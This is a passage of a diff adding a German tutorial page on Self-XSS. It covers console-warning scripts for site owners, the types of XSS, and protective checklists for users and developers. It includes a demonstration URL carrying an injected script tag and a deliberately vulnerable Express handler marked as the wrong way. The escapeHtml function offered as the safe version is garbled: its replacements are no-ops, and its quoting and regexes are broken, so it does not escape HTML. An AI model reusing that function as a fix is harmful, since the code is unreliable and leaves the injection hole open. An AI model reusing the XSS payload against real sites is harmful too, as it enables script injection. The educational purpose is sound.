+4. Beide Checkboxen aktivieren
+5. "Leeren" klicken</code></pre>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- via DevTools -->
+                    <div class="code-block">
+                        <div class="code-header">
+                            <div class="box-title"><strong>Oder schnell via DevTools</strong></div>
+                        </div>
+                        <pre><code class="language-text">F12 → Application/Speicher Tab → Storage → Clear site data</code></pre>
+                    </div>
+                </section>
+
+                <!-- Wie schütze ich meine Website? -->
+                <section class="categories">
+                    <h2 id="wie-schuetze-ich-meine-website-developer-perspektive">Wie schütze ich meine Website? (Developer-Perspektive)</h2>
+                    <p>Als Web-Developer kannst du deine User durch eine Console-Warnung schützen. Das verhindert zwar
+                        nicht technisch die Code-Ausführung, aber es schreckt ab und klärt auf.</p>
+
+                    <h3 id="console-warnung-implementieren">Console-Warnung implementieren</h3>
+                    <div class="info-box">
+                        <strong class="box-title no-toc">Warum eine Console-Warnung?
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <ul class="arrow-list">
+                            <li>Klärt User auf, die die Console öffnen</li>
+                            <li>Zeigt Security-Awareness (gut fürs Image)</li>
+                            <li>Kann unerfahrene User vom Code-Einfügen abhalten</li>
+                            <li>Ist Best Practice (Facebook, Twitter, Google machen das alle)</li>
+                            <li>Kostet fast nichts (5-10 Zeilen Code)</li>
+                        </ul>
+                    </div>
+
+                    <h3 id="implementierungs-optionen">Implementierungs-Optionen</h3>
+
+                    <details open="">
+                        <summary><strong>Option 1: Minimale Warnung (empfohlen für kleine Sites)</strong></summary>
+                        <div class="details-content">
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <div class="box-title"><strong>main.js (am Anfang einfügen)
+                                            nötig</strong></div>
+                                </div>
+                                <pre><code class="language-javascript">// Console Security Warning
+console.log(
+    '%c⚠️ STOP!',
+    'color: red; font-size: 30px; font-weight: bold;'
+);
+
+console.log(
+    '%cWenn dich jemand gebeten hat, hier Code einzufügen, ist das ein Betrugsversuch!',
+    'color: red; font-size: 14px; font-weight: bold;'
+);
+
+console.log(
+    '%cDas Einfügen von Code kann Angreifern Zugriff auf deinen Account geben.',
+    'color: orange; font-size: 12px;'
+);
+
+console.log(
+    '%cMehr Infos: https://de.wikipedia.org/wiki/Self-XSS',
+    'color: #999; font-size: 11px;'
+);</code></pre>
+                            </div>
+                            <p><strong>Vorteile:</strong> Simpel, direkt, immer sichtbar</p>
+                            <p><strong>Nachteile:</strong> Erscheint bei jedem Reload (könnte nerven)</p>
+                        </div>
+                    </details>
+
+                    <details>
+                        <summary><strong>Option 2: Warnung nur 1x pro Session (besser für UX)</strong></summary>
+                        <div class="details-content">
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <div class="box-title"><strong>main.js (am Anfang einfügen)
+                                            nötig</strong></div>
+                                </div>
+                                <pre><code class="language-javascript">// Console Security Warning (nur einmal pro Session)
+if (!sessionStorage.getItem('consoleWarningShown')) {
+    console.log(
+        '%c⚠️ STOP!',
+        'color: red; font-size: 30px; font-weight: bold;'
+    );
+    
+    console.log(
+        '%cWenn dich jemand gebeten hat, hier Code einzufügen, ist das ein Betrugsversuch!',
+        'color: red; font-size: 14px; font-weight: bold;'
+    );
+    
+    console.log(
+        '%cDas Einfügen von Code kann Angreifern Zugriff auf deinen Account geben.',
+        'color: orange; font-size: 12px;'
+    );
+    
+    console.log(
+        '%cMehr Infos: https://de.wikipedia.org/wiki/Self-XSS',
+        'color: #999; font-size: 11px;'
+    );
+    
+    // Markiere dass Warnung gezeigt wurde
+    sessionStorage.setItem('consoleWarningShown', 'true');
+    
+    console.log('\n'); // Leerzeile für Abstand
+}
+
+// Hier kommt dein normaler Code / Begrüßung
+console.log('Willkommen bei MeineWebsite.com! 👋');</code></pre>
+                            </div>
+                            <p><strong>Vorteile:</strong> Nervt nicht bei jedem Reload, trotzdem effektiv</p>
+                            <p><strong>Nachteile:</strong> Verschwindet nach Browser-Schließung (Session endet)</p>
+                        </div>
+                    </details>
+
+                    <details>
+                        <summary><strong>Option 3: Facebook-Style (großformatig)</strong></summary>
+                        <div class="details-content">
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <div class="box-title"><strong>console-security.js (eigene Datei)</strong></div>
+                                </div>
+                                <pre><code class="language-javascript">// Facebook-inspirierte Console-Warnung
+(function() {
+    // ASCII Art Warnung
+    console.log(`%c
+    ███████╗████████╗ ██████╗ ██████╗ 
+    ██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗
+    ███████╗   ██║   ██║   ██║██████╔╝
+    ╚════██║   ██║   ██║   ██║██╔═══╝ 
+    ███████║   ██║   ╚██████╔╝██║     
+    ╚══════╝   ╚═╝    ╚═════╝ ╚═╝     
+    `, 'color: red; font-weight: bold;');
+    
+    console.log('%cDies ist eine Browser-Funktion für Entwickler.', 
+        'font-size: 18px; font-weight: bold;');
+    
+    console.log('%cWenn dich jemand gebeten hat, etwas hier einzufügen ' +
+                'oder einzufügen, um eine Funktion zu "aktivieren", ' +
+                'handelt es sich um einen Betrug, der Angreifern ' +
+                'Zugriff auf deinen Account verschafft.',
+        'font-size: 14px;');
+    
+    console.log('%cWeitere Informationen findest du unter: ' +
+                'https://de.wikipedia.org/wiki/Self-XSS',
+        'font-size: 12px; color: #999;');
+})();</code></pre>
+                            </div>
+                            <p><strong>Im HTML dann einbinden (vor main.js):</strong></p>
+                            <pre><code class="language-html">&lt;script src="/assets/js/console-security.js"&gt;&lt;/script&gt;
+&lt;script src="/assets/js/main.js" defer&gt;&lt;/script&gt;</code></pre>
+                            <p><strong>Vorteile:</strong> Sehr auffällig, professionell, separater Code</p>
+                            <p><strong>Nachteile:</strong> Extra Datei, mehr Aufwand</p>
+                        </div>
+                    </details>
+
+                    <details>
+                        <summary><strong>Option 4: Kombination mit Begrüßung</strong></summary>
+                        <div class="details-content">
+                            <p>Du kannst Warnung UND Begrüßung kombinieren:</p>
+                            <div class="code-block">
+                                <div class="code-header">
+                                    <div class="box-title"><strong>main.js</strong></div>
+                                </div>
+                                <pre><code class="language-javascript">// === SICHERHEITSWARNUNG (Immer zuerst!) ===
+console.log('%c⚠️ Console-Warnung', 
+    'color: #ff6b6b; font-size: 18px; font-weight: bold;');
+console.log('%cFalls dich jemand gebeten hat, Code hier einzufügen: DON\'T! ' +
+            'Das könnte ein Betrugsversuch sein.',
+    'color: #f06595; font-size: 13px;');
+console.log('%cMehr Infos: https://de.wikipedia.org/wiki/Self-XSS',
+    'color: #999; font-size: 11px;');
+
+console.log('\n'); // Leerzeile
+
+// === BEGRÜßUNG ===
+console.log(`
+    ▄▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▄
+    █  ░░  DevPanicZone        ░░  █
+    █  ░░  Code | Debug | Win  ░░  █
+    ▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀
+
+         ⚡ Don't Panic. Cheat. ⚡
+`);
+
+console.log('%cHey! Schön, dass du hier bist! 👋', 
+    'color: #4ecdc4; font-size: 14px; font-weight: bold;');
+console.log('%c💡 Du siehst: Sauberer Code, responsive Design, made with ☕', 
+    'color: #95e1d3; font-size: 12px;');
+console.log('%c📫 hello@devpaniczone.de', 
+    'color: #f38181; font-size: 11px;');</code></pre>
+                            </div>
+
+                            <!-- <div class="code-block">
+                                <div class="code-title">main.js</div>
+                                <pre><code class="language-javascript">// === SICHERHEITSWARNUNG (Immer zuerst!) ===
+console.log('%c⚠️ Console-Warnung', 
+    'color: #ff6b6b; font-size: 18px; font-weight: bold;');
+console.log('%cFalls dich jemand gebeten hat, Code hier einzufügen: DON\'T! ' +
+            'Das könnte ein Betrugsversuch sein.',
+    'color: #f06595; font-size: 13px;');
+console.log('%cMehr Infos: https://de.wikipedia.org/wiki/Self-XSS',
+    'color: #999; font-size: 11px;');
+
+console.log('\n'); // Leerzeile
+
+// === BEGRÜßUNG ===
+console.log(`
+    ▄▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▄
+    █  ░░  DevPanicZone  ░░  █
+    █  ░░  Code | Debug | Win  ░░  █
+    ▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀
+
+         ⚡ Don't Panic. Cheat. ⚡
+`);
+
+console.log('%cHey! Schön, dass du hier bist! 👋', 
+    'color: #4ecdc4; font-size: 14px; font-weight: bold;');
+console.log('%c💡 Du siehst: Sauberer Code, responsive Design, made with ☕', 
+    'color: #95e1d3; font-size: 12px;');
+console.log('%c📫 hello@devpaniczone.de', 
+    'color: #f38181; font-size: 11px;');</code></pre>
+                            </div> -->
+                            <p><strong>Vorteile:</strong> Sicherheit UND Persönlichkeit, alles an einem Ort</p>
+                            <p><strong>Tipp:</strong> Warnung immer ZUERST, damit sie nicht übersehen wird!</p>
+                        </div>
+                    </details>
+
+                    <h3 id="zusaetzliche-schutzmassnahmen">Zusätzliche Schutzmaßnahmen</h3>
+                    <div class="info-box">
+                        <strong class="box-title no-toc">Weitere Best Practices
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <ul class="arrow-list">
+                            <li><strong>CSP Headers:</strong> Content Security Policy kann XSS-Angriffe erschweren
+                                <pre style="margin-top: 0.5rem;"><code class="language-plaintext">Content-Security-Policy: default-src 'self'; script-src 'self'</code></pre>
+                            </li>
+                            <li><strong>HttpOnly Cookies:</strong> Session-Cookies sollten HttpOnly-Flag haben (nicht
+                                via JS auslesbar)</li>
+                            <li><strong>HTTPS only:</strong> Immer HTTPS nutzen, verhindert Man-in-the-Middle</li>
+                            <li><strong>SameSite Cookies:</strong> CSRF-Schutz durch SameSite-Attribut</li>
+                            <li><strong>Regular Security Audits:</strong> Prüfe regelmäßig auf Schwachstellen</li>
+                        </ul>
+                    </div>
+                </section>
+
+                <!-- XSS allgemein -->
+                <section class="categories">
+                    <h2 id="xss-allgemein-verstehen">XSS allgemein verstehen</h2>
+
+                    <p>Self-XSS ist nur eine Variante von Cross-Site Scripting (XSS). Lass uns kurz die verschiedenen
+                        Arten anschauen:</p>
+
+                    <h3 id="typen-von-xss">Typen von XSS</h3>
+
+                    <div class="info-box">
+                        <strong class="box-title no-toc">1. Reflected XSS (Reflektiertes XSS)
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <p>Schadcode wird über URL-Parameter eingefügt und direkt zurückgegeben:</p>
+                        <pre><code class="language-plaintext">https://example.com/search?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
+                        <p><strong>Angriff:</strong> Opfer klickt auf präparierte URL</p>
+                        <p><strong>Schutz:</strong> Input-Validierung, Output-Encoding</p>
+                    </div>
+
+                    <div class="info-box">
+                        <strong class="box-title no-toc">2. Stored XSS (Persistentes XSS)
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <p>Schadcode wird in Datenbank gespeichert und bei jedem Abruf ausgegeben:</p>
+                        <p><strong>Beispiel:</strong> Kommentarfeld, Forenposts, Profilbeschreibungen</p>
+                        <p><strong>Gefahr:</strong> Betrifft alle User, die den Content sehen</p>
+                        <p><strong>Schutz:</strong> Strenge Input-Validierung, Sanitization, Output-Encoding</p>
+                    </div>
+
+                    <div class="info-box">
+                        <strong class="box-title no-toc">3. DOM-based XSS
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <p>JavaScript manipuliert das DOM direkt, ohne Server-Interaktion:</p>
+                        <pre><code class="language-javascript">// Unsicher:
+document.getElementById('output').innerHTML = userInput;
+
+// Sicher:
+document.getElementById('output').textContent = userInput;</code></pre>
+                        <p><strong>Schutz:</strong> Keine unsanitized Daten ins DOM, textContent statt innerHTML</p>
+                    </div>
+
+                    <div class="info-box">
+                        <strong class="box-title no-toc">4. Self-XSS (Social Engineering)
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <p>User führt Code selbst aus (das haben wir gerade gelernt!)</p>
+                        <p><strong>Besonderheit:</strong> Keine technische Schwachstelle, sondern Manipulation</p>
+                        <p><strong>Schutz:</strong> Aufklärung, Console-Warnung, User-Education</p>
+                    </div>
+
+                    <h3 id="xss-verhindern-entwickler-checkliste">XSS verhindern – Entwickler-Checkliste</h3>
+
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <div class="box-title"><strong>Input Validation &amp; Sanitization</strong></div>
+                        </div>
+                        <div>
+                            <pre><code class="language-javascript">// ❌ NIEMALS so:
+app.get('/search', (req, res) =&gt; {
+    const query = req.query.q;
+    res.send(`&lt;h1&gt;Ergebnisse für: ${query}&lt;/h1&gt;`);
+});
+
+// ✅ IMMER so:
+const escapeHtml = (unsafe) =&gt; {
+    return unsafe
+        .replace(/&amp;/g, "&amp;")
+        .replace(//g, "&gt;")
+        .replace(/"/g, """)
+        .replace(/'/g, "'");
+};
+
+app.get('/search', (req, res) =&gt; {
+    const query = escapeHtml(req.query.q);
+    res.send(`&lt;h1&gt;Ergebnisse für: ${query}&lt;/h1&gt;`);
+});</code></pre>
+                        </div>
+                    </div>
+
+                    <div class="code-block">
+                        <div class="code-header">
+                            <div class="box-title"><strong>Frontend – Sichere DOM-Manipulation</strong></div>
+                        </div>
+                        <pre><code class="language-javascript">// ❌ Gefährlich:
+element.innerHTML = userInput;
+element.outerHTML = userInput;
+document.write(userInput);
+eval(userInput);
+
+// ✅ Sicher:
+element.textContent = userInput;  // Text nur, kein HTML
+element.setAttribute('data-value', userInput);
+
+// Wenn HTML nötig ist:
+const sanitized = DOMPurify.sanitize(userInput);  // Library nutzen!
+element.innerHTML = sanitized;</code></pre>
+                    </div>
+
+                    <div class="info-box notice">
+                        <strong class="box-title notice no-toc">XSS-Schutz Checkliste
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,
+                0,15.25,0ZM24.85,10.96l-10.96,10.96c-.33.33-.76.49-1.19.49s-.86-.16-1.19-.49l-5.13-5.13c-.66-.66-.66-1.73,
+                0-2.39.66-.66,1.73-.66,2.39,0l3.94,3.94,9.76-9.76c.66-.66,1.73-.66,2.39,0,.66.66.66,1.73,0,2.39Z"></path>
+                            </svg>
+                        </strong>
+                        <div class="grid-2col">
+                            <div>
+                                <ul class="arrow-list">
+                                    <li>✓ Alle User-Inputs validieren (Frontend UND Backend)</li>
+                                    <li>✓ HTML-Entities escapen bei Output</li>
+                                    <li>✓ Content Security Policy (CSP) Headers setzen</li>
+                                    <li>✓ HttpOnly-Flag bei Session-Cookies</li>
+                                    <li>✓ <code class="inline">textContent</code> statt <code class="inline">innerHTML</code> nutzen</li>
+                                </ul>
+                            </div>
+                            <div>
+                                <ul class="arrow-list">
+                                    <li>✓ Niemals <code class="inline">eval()</code> mit User-Input</li>
+                                    <li>✓ Template-Engines mit Auto-Escaping nutzen</li>
+                                    <li>✓ DOMPurify oder ähnliche Libraries für HTML-Sanitization</li>
+                                    <li>✓ Regular Security Audits &amp; Penetration Tests</li>
+                                    <li>✓ Console-Warnung gegen Self-XSS</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+
+                </section>
+
+                <section class="categories">
+                    <h2 id="best-practices-zusammenfassung">Best Practices – Zusammenfassung</h2>
+
+                    <div class="info-box">
+                        <strong class="box-title no-toc">Für User
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <div class="grid-2col">
+                            <div>
+                                <ul class="arrow-list">
+                                    <li><strong>Niemals</strong> fremden Code in die Console kopieren</li>
+                                    <li>Lerne die Basics: Was ist die Console? Wofür ist sie da?</li>
+                                    <li>Sei skeptisch bei "zu gut um wahr zu sein"-Angeboten</li>
+                                    <li>Two-Factor Authentication (2FA) aktivieren</li>
+                                </ul>
+                            </div>
+                            <div>
+                                <ul class="arrow-list">
+                                    <li>Freunde &amp; Familie aufklären</li>
+                                    <li>Scam-Versuche melden an die Plattform</li>
+                                    <li>Passwörter regelmäßig ändern</li>
+                                    <li>Offizielle Apps nutzen, nicht Web-Version für sensible Aktionen</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+
+
+                    <div class="info-box">
+                        <strong class="box-title no-toc">Für Entwickler
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <ul class="arrow-list">
+                            <li><strong>Console-Warnung implementieren</strong> – auch wenn deine Site (noch) keine
+                                Login hat</li>
+                        </ul>
+                        <div class="grid-2col">
+                            <div>
+                                <ul class="arrow-list">
+                                    <li>CSP Headers setzen für zusätzlichen Schutz</li>
+                                    <li>HttpOnly &amp; Secure Flags bei Cookies</li>
+                                    <li>Alle Inputs validieren &amp; sanitizen</li>
+                                    <li>Output-Encoding konsequent anwenden</li>
+                                    <li><code class="inline">innerHTML</code> meiden, <code class="inline">textContent</code> nutzen</li>
+                                </ul>
+                            </div>
+                            <div>
+                                <ul class="arrow-list">
+                                    <li>Security-Awareness im Team fördern</li>
+                                    <li>Regular Security Audits durchführen</li>
+                                    <li>OWASP Top 10 kennen und befolgen</li>
+                                    <li>User über Gefahren aufklären (Blog, FAQ, etc.)</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+
+
+                    <div class="info-box">
+                        <strong class="box-title no-toc">Für Website-Betreiber
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <div class="grid-2col">
+                            <div>
+                                <ul class="arrow-list">
+                                    <li>Aktiv über Scam-Versuche informieren (Social Media, Newsletter)</li>
+                                    <li>Security-Guides für User bereitstellen</li>
+                                    <li>Verdächtige Aktivitäten monitoren</li>
+                                    <li>Support-Team schulen für Self-XSS-Vorfälle</li>
+                                </ul>
+                            </div>
+                            <div>
+                                <ul class="arrow-list">
+                                    <li>Rate Limiting für API-Calls implementieren</li>
+                                    <li>Ungewöhnliche Patterns erkennen (z.B. plötzlich viele Spam-Posts)</li>
+                                    <li>Schnelle Reaktion bei bekannt gewordenen Scams</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+
+                </section>
+
+                <!-- Weitere Ressourcen -->
+                <section class="categories">
+                    <h2 id="weitere-ressourcen-links">Weitere Ressourcen &amp; Links</h2>
+
+                    <div class="info-box">
+                        <strong class="box-title no-toc">Zum Weiterlesen
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM15.56,3.83c1.22,0,2.21.99,2.21,2.21s-.99,2.21-2.21,2.21-2.21-.99-2.21-2.21.99-2.21,2.21-2.21ZM18.51,25.93h-5.9c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h1.47v-8.84h-1.47c-.82,0-1.47-.66-1.47-1.47s.66-1.47,1.47-1.47h2.95c.82,0,1.47.66,1.47,1.47v10.32h1.47c.82,0,1.47.66,1.47,1.47s-.66,1.47-1.47,1.47Z"></path>
+                            </svg>
+                        </strong>
+                        <ul class="arrow-list">
+                            <li><strong>Wikipedia Self-XSS:</strong> <a href="https://de.wikipedia.org/wiki/Self-XSS" target="_blank">de.wikipedia.org/wiki/Self-XSS</a></li>
+                            <li><strong>OWASP XSS:</strong> <a href="https://owasp.org/www-community/attacks/xss/" target="_blank">owasp.org/www-community/attacks/xss/</a></li>
+                            <li><strong>MDN Web Security:</strong> <a href="https://developer.mozilla.org/en-US/docs/Web/Security" target="_blank">developer.mozilla.org/en-US/docs/Web/Security</a></li>
+                            <li><strong>Content Security Policy:</strong> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank">developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a></li>
+                            <li><strong>DOMPurify (Sanitization Library):</strong> <a href="https://github.com/cure53/DOMPurify" target="_blank">github.com/cure53/DOMPurify</a></li>
+                        </ul>
+                    </div>
+
+                    <!-- <div class="info-box">
+                        <h3>🎓 DevPanicZone Tutorials</h3>
+                        <p>Verwandte Tutorials auf dieser Website:</p>
+                        <ul class="arrow-list">
+                            <li><a href="/tutorials/misc/tools/dev-tools.html">Browser DevTools – Dein wichtigstes Entwicklungswerkzeug</a></li>
+                            <li><a href="/tutorials/misc/web/privacy.html">Privacy & DSGVO – Datenschutz im Web</a> (geplant)</li>
+                            <li><a href="/tutorials/javascript/javascript-basics.html">JavaScript Basics</a></li>
+                        </ul>
+                    </div> -->
+                </section>
+
+                <!-- Zusammenfassung -->
+                <section class="categories">
+                    <h2 id="zusammenfassung">Zusammenfassung</h2>
+
+                    <p><strong>Self-XSS</strong> ist ein Social Engineering Angriff, bei dem du durch Manipulation dazu
+                        gebracht wirst, bösartigen Code selbst auszuführen. Die Konsequenzen können gravierend sein:
+                        Account-Übernahme, Datenverlust, Spam-Versand in deinem Namen.</p>
+
+                    <div class="info-box warning">
+                        <strong class="box-title warning no-toc">Das Wichtigste in Kürze
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,
+                15.25-6.83,15.25-15.25S23.67,0,15.25,0ZM14.35,4.75h1.71c.6,
+                0,1.07.49,1.06,1.09l-.35,12.32c-.02.57-.48,1.03-1.06,1.03h-.98c-.57,
+                0-1.04-.45-1.06-1.02l-.38-12.32c-.02-.6.46-1.09,1.06-1.09ZM16.7,
+                25.2c-.39.37-.88.55-1.46.55s-1.04-.18-1.44-.55c-.39-.37-.59-.81-.59-1.33s.2-.95.59-1.32c.4-.37.88-.55,
+                1.44-.55s1.07.18,1.46.55c.39.37.59.81.59,1.32s-.2.96-.59,1.33Z"></path>
+                            </svg>
+                        </strong>
+                        <ul class="arrow-list">
+                            <li><strong>Goldene Regel:</strong> NIEMALS fremden Code in die Browser-Console kopieren!
+                            </li>
+                            <li><strong>Warnsignale:</strong> Zu-gut-Versprechen, Zeitdruck, "geheime Tricks"</li>
+                            <li><strong>Schutz als User:</strong> Skeptisch sein, 2FA nutzen, Freunde warnen</li>
+                            <li><strong>Schutz als Developer:</strong> Console-Warnung implementieren, Security Best
+                                Practices</li>
+                            <li><strong>Bei Verdacht:</strong> Sofort Passwort ändern, Sessions beenden, Support
+                                kontaktieren</li>
+                        </ul>
+                    </div>
+
+                    <div class="info-box notice">
+                        <strong class="box-title notice no-toc">Nächste Schritte
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30.5 30.5" width="30" height="30" fill="currentColor">
+                                <path d="M15.25,0C6.83,0,0,6.83,0,15.25s6.83,15.25,15.25,15.25,15.25-6.83,15.25-15.25S23.67,
+                0,15.25,0ZM24.85,10.96l-10.96,10.96c-.33.33-.76.49-1.19.49s-.86-.16-1.19-.49l-5.13-5.13c-.66-.66-.66-1.73,
+                0-2.39.66-.66,1.73-.66,2.39,0l3.94,3.94,9.76-9.76c.66-.66,1.73-.66,2.39,0,.66.66.66,1.73,0,2.39Z"></path>
